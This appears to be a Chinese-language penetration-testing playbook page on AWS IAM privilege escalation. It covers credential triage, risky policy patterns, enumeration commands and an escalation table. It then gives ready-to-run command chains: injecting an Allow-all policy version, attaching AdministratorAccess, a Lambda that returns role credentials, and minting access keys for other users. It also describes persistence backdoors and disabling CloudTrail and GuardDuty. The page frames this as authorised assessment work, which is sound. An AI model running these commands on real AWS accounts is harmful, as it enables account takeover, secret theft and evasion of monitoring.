# AWS 攻击面与 IAM 提权（进阶）

> 适用：已拿到 AWS 凭据、策略文件或 CloudFormation 模板，需要在授权评估中确认真实权限边界、给出可复现提权链与后渗透影响面。

## 认什么

**凭据类型决定时间窗**

| 类型 | 识别特征 | 有效期 | 行动要点 |
|---|---|---|---|
| 长期 AK/SK | `AKIA` 开头，20 字符 | 永久 | 可慢慢枚举，优先评估 IAM 写权限 |
| STS 临时凭据 | `ASIA` 开头 + SessionToken | 15 分钟 ~ 12 小时（Role Chaining 上限 1 小时） | 先确认身份，再抢做提权/持久化 |
| 实例 Role | 从 `169.254.169.254` 取 | 自动轮换 | 与来源实例绑定，跨实例使用会触发告警 |
| SSO/Cognito Token | `~/.aws/sso/cache/` 内 `accessToken`；Cognito 为 JWT | 8 小时 / 1 小时 | Cognito 常可换出未认证身份的 IAM 角色 |

来源异常"顺手"时先怀疑蜜罐：`aws sts get-access-key-info --access-key-id AKIA...` 与目标主体比对，不符就降速。

**策略文件先分类**：`"Version": "2012-10-17"` 是 IAM Policy；带 `Principal` 的是 Resource Policy；`"Action": "sts:AssumeRole"` 是 Trust Policy；`AWSTemplateFormatVersion` 是 CloudFormation；`handler(event, context)` 是 Lambda 代码。前三类看授权边界，最后一类看注入点与环境变量。

**危险模式（按命中优先级）**

- `"Principal": "*"` 或 `{"AWS": "*"}`：匿名/跨账户入口，最高优先级。
- `NotAction` + `Allow`：隐式授予除指定外的一切，等价于拿到 `iam:PassRole`、`iam:CreateUser`、`sts:AssumeRole`。
- `"Action": "*"` / `"s3:*"`；`s3:GetObject` 配 `"Resource": "*"` 可读全账户桶。
- `iam:PassRole` 的 `Resource: *`：可把任意角色传给计算服务 → 全服务提权。
- `Condition` 可绕：`StringLike` 的 `*@company.com` 在 https 订阅端点下只要 URL 含该串即通过；`aws:SourceIp` 可能被代理出口绕过。

## 打哪（命令）

**确认身份与权限（"组"这层和内联策略正文最容易漏）**

```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name USER; aws iam list-user-policies --user-name USER
aws iam get-user-policy --user-name USER --policy-name POLICY
aws iam list-groups-for-user --user-name USER; aws iam list-attached-group-policies --group-name GROUP; aws iam get-group-policy --group-name GROUP --policy-name POLICY
aws iam list-attached-role-policies --role-name ROLE; aws iam get-role-policy --role-name ROLE --policy-name POLICY
aws iam list-policies --scope Local
aws iam get-policy-version --policy-arn ARN --version-id DEFAULT_VERSION_ID
```

权限不明时上工具：`enumerate-iam.py` 暴力枚举可用 API；Pacu `iam__enum_permissions` / `iam__privesc_scan`；PMapper `graph create` + `query "who can do iam:PassRole with arn:aws:iam::*:role/*"`；Cloudsplaining 查过度授权；ScoutSuite 出基线。

**提权路径压缩表（46 个服务按服务族归并；未列出的服务本库暂无条目，按实际权限枚举现推）**

| 服务族 | 典型提权动作 | 关键权限 |
|---|---|---|
| IAM 策略操纵 | 建新策略版本 `Allow */*` 并设默认；附加 `AdministratorAccess`；给高权限用户建 AK；加 Admin 组；改信任策略允许自己 | `iam:CreatePolicyVersion`、`SetDefaultPolicyVersion`、`AttachUserPolicy`/`AttachGroupPolicy`/`AttachRolePolicy`、`PutUserPolicy`、`AddUserToGroup`、`CreateAccessKey`、`UpdateAssumeRolePolicy` |
| IAM 登录凭据 | 设控制台密码、接管 MFA、篡改 SAML 提供者 | `iam:CreateLoginProfile`、`UpdateLoginProfile`、`CreateVirtualMFADevice` + `EnableMFADevice`、`UpdateSAMLProvider` |
| STS/Organizations | AssumeRole 到 `Principal:*` 的角色、跨账户角色链、Roles Anywhere（X.509） | `sts:AssumeRole`、`AssumeRoleWithSAML` |
| SSO/Cognito | 改权限集内联策略、改身份池角色映射 | `sso:PutInlinePolicyToPermissionSet`、`sso:CreateAccountAssignment`、`cognito-identity:SetIdentityPoolRoles` |
| Lambda | PassRole 建函数回读环境变量；改已有函数代码；改配置注入环境变量 | `iam:PassRole` + `lambda:CreateFunction`/`InvokeFunction`；`lambda:UpdateFunctionCode`/`UpdateFunctionConfiguration` |
| EC2 | PassRole + RunInstances + UserData 打 IMDS；改实例属性；推 SSH 公钥 | `iam:PassRole` + `ec2:RunInstances`；`ec2:ModifyInstanceAttribute`；`ec2-instance-connect:SendSSHPublicKey` |
| ECS/EKS | 注册恶意 task definition + RunTask；ExecuteCommand 进容器；注册容器实例 | `iam:PassRole` + `ecs:RegisterTaskDefinition`/`RunTask` |
| 计算/编排其余 | Glue CreateJob/CreateDevEndpoint、SageMaker Notebook、CodeBuild StartBuild（覆盖 buildspec）、CloudFormation CreateStack/UpdateStack、Step Functions TestState、EventBridge CreateSchedule 等 | `iam:PassRole` + 对应 `Create*`/`Start*` |
| SSM | SendCommand / StartSession 到受管 EC2，窃取实例角色 | `ssm:SendCommand`、`ssm:StartSession` |
| 数据与密钥 | SecretsManager 读值、SSM Parameter Store 递归、KMS 改密钥策略/授权、DynamoDB 资源策略 | `secretsmanager:GetSecretValue`、`ssm:GetParametersByPath`、`kms:PutKeyPolicy`、`kms:CreateGrant`、`dynamodb:PutResourcePolicy` |
| 供应链 | 往 CF 模板桶/Terraform State 桶写入、ECR 改仓库策略/覆盖镜像 | `s3:PutObject`、`ecr:SetRepositoryPolicy`、`ecr:PutImage` |
| 数据库/消息/DNS | 重置 RDS 密码、订阅 SNS/收 SQS 消息、改 Route53 记录 | `rds:ModifyDBInstance`、`sns:Subscribe`、`sqs:ReceiveMessage`、`route53:ChangeResourceRecordSets` |

**Top 5 高频路径（可直接复现）**

```bash
# 1) 策略版本注入
aws iam create-policy-version --policy-arn ARN \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --set-as-default
# 2) 附加托管管理员
aws iam attach-user-policy --user-name ME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
# 3) PassRole + Lambda 回读凭据（handler return dict(os.environ)）
aws lambda create-function --function-name privesc --runtime python3.9 \
  --role TARGET_ROLE_ARN --handler steal.handler --zip-file fileb:///tmp/steal.zip
aws lambda invoke --function-name privesc /tmp/out.json && cat /tmp/out.json
# 4) 给高权限用户建 AK（已有 2 个时先删一个）
aws iam list-access-keys --user-name TARGET; aws iam create-access-key --user-name TARGET
# 5) 枚举宽松信任策略
aws iam list-roles --query 'Roles[].{n:RoleName,t:AssumeRolePolicyDocument}' --output json | grep -iE '"AWS": *"\*"|:iam::[0-9]{12}:'
```

**横向与后渗透（拿到权限后按价值排序）**

- 数据面：`aws s3 sync`；EBS 快照与 AMI；RDS 快照导出；DynamoDB `scan`；`secretsmanager batch-get-secret-value`；`ssm get-parameters-by-path --path / --recursive --with-decryption`；Lambda 环境变量。
- 横向：跨账户 `OrganizationAccountAccessRole` 与外部账户信任角色；SSM/EC2 Instance Connect Endpoint 进私有子网。
- 持久化：后门用户 + AK；角色信任策略加外部账户；隐藏策略版本（`--no-set-as-default` 后再切默认）；Lambda Layer/`AWS_LAMBDA_EXEC_WRAPPER`/别名 1% 权重；EventBridge 定时规则。
- 清痕迹属改写审计面，仅在授权明确允许时做：`cloudtrail stop-logging`/`update-trail`、GuardDuty 归档过滤器、`configservice stop-configuration-recorder`。

## 什么算成

- 提权链有一手证据：策略里确有该权限 + 调用成功且生效（如 `create-policy-version --set-as-default` 后该版本确为 `Allow */*`，或新 AK 能完成原身份做不到的调用）。
- 横向：AssumeRole 成功返回凭据，且在目标账户 `get-caller-identity` 成功。
- 后渗透：读到敏感对象/Secret 明文/凭据内容，不是只有列表条目。停在证明层，不批量拖库、不真删数据、不留后门。

## 假点

- `get-caller-identity` 成功只说明凭据有效，不是提权。
- 有 PassRole 但目标角色不信任该计算服务（Lambda 角色需信任 `lambda.amazonaws.com`）→ 建资源失败，不算提权成功。
- 权限边界与 Organizations SCP 会让"已附加 Admin 策略"仍然 AccessDenied，必须以实测 API 为准。
- 把 Identity Policy 与 Resource Policy 混读：Resource Policy 的 `Allow *` 往往只对某类 Principal 生效。
- GuardDuty/CloudTrail 有记录不等于漏洞不成立；操作噪声本身是风险，报告要写清检测面。

## 与其他包联动

- 凭据来源与跨云横向：`cloud-05-云凭据-IAM-元数据.md`
- 多云判型与首枪：`cloud-01-多云资产与攻击面概览.md`；云元数据 × SSRF：`../../web-ssrf-render/knowledge/ssrf-internal-network-02-二、云元数据-打内网核心.md`
- Azure/GCP 对照（PassRole 等价 `actAs`）：`cloud-03-Azure与GCP.md`
- 服务端代码里的凭据与输入点：`../../source-audit/knowledge/source-code-audit-03-三、鉴权审计要点.md`；报告口径：`../../../../rules/40-evidence-report.md`
